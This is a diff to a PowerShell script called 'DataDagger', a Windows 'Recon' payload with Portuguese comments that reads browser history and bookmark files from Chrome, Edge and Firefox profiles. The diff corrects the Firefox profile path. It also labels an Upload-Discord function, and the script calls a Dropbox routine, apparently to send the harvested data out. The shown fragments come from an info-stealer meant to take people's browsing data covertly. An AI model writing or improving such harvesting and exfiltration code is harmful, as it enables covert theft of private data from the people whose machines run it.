@@ -1,6 +1,6 @@
 ############################################################################################################################################################ 
 #                                                                                                                                                          #
-#   Nome       : DataDagger                                                                                                                                 #
+#   Nome       : DataDagger                                                                                                                                #
 #   Autor      : Clank                                                                                                                                     #
 #   Categoria  : Recon                                                                                                                                     #
 #   Alvo       : Windows 10,11                                                                                                                             #
@@ -494,7 +494,7 @@ function Get-BrowserData {
     elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
     elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
     elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
-    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
+    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release-*\places.sqlite"}
     
 
     $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
@@ -543,6 +543,7 @@ if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 
 ############################################################################################################################################################
 
+#Upload para o Discord
 function Upload-Discord {
 
 [CmdletBinding()]
